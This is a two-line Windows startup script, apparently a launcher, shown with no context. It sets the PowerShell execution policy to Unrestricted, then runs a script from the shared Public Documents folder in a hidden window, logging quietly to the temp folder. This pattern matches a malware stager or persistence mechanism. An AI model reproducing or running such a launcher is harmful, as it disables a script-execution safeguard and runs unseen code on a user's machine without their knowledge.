PowerShell -Command "Set-ExecutionPolicy Unrestricted" >> "%TEMP%\StartupLog.txt" 2>&1
powershell -windowstyle hidden C:\Users\Public\Documents\Autism.ps1 >> "%TEMP%\StartupLog.txt" 2>&1